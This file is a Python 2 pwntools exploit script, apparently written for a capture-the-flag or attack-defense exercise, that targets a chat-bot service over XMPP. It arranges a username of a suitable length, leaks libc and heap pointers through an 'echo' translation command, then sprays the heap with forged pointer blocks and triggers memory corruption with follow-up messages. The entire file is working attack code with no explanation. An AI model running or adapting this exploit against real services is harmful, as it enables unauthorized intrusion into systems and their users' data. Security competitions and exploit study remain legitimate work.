#!/usr/bin/env python2

from pwn import *
import sys, random
from vbot import VBot, VBotBase
from pwnlib.util.fiddling import randoms

CHECK_DELAY = 1
CHECK_TIMES = 10

def _encode(raw, encoding):
    if encoding == 'hex':
        return raw.encode('hex')
    else:
        return raw

def main():
    host = sys.argv[1]
    port = int(sys.argv[2])

    class GoodNameBot(VBotBase):
        def __init__(self, *args, **kwargs):
            VBotBase.__init__(self, *args, **kwargs)

        def session_bind(self, e):
            log.info('bound to %s', self.boundjid.bare)
            if len(self.boundjid.bare) % 2 == 0:
                log.info('request another user')
                self.disconnect()
                self.connect()

    A = GoodNameBot()
    A.connect()
    A.process(block=False)

    class MyVBot(VBot):
        def target_ready(self, e):
            VBot.target_ready(self, e)

            prefix = 'O' * 0x20 + A.boundjid.bare
            # leak
            d = self.try_leak(0x800, prefix=prefix)[:0x20]
            libc_ptr = u64(d[:8])
            heap_ptr = u64(d[0x10:0x18])
            log.info('libc ptr = %#x', libc_ptr)
            log.info('heap ptr = %#x', heap_ptr)

            spray_addr = heap_ptr + 0x30

            # raw_input('attach')
            A.message_sync(A.make_message(self.target, 'bye'))

            block = ''
            block += p64(spray_addr + 0x30) + p64(0)
            block += p64(spray_addr) + p64(len(A.boundjid.bare))
            payload = block * (0x120 / len(block))
            for _ in xrange(8):
                self.translate('x', payload.encode('hex'), 'hex')
            A.message_sync(A.make_message(self.target, 'ping', mtype='chat'))
            A.check_done()
            self.check_done()

        def try_leak(self, n, prefix=''):
            ret = self.translate('echo', prefix.ljust(n * 2, 'O'), 'hex')
            return ret

    B = MyVBot((host, port))
    B.connect()
    B.process(block=True)

    sys.exit(0)


if __name__ == '__main__':
    # logging.basicConfig(level=logging.DEBUG, format='%(levelname)-8s %(message)s')
    # context.log_level = 'DEBUG'
    main()
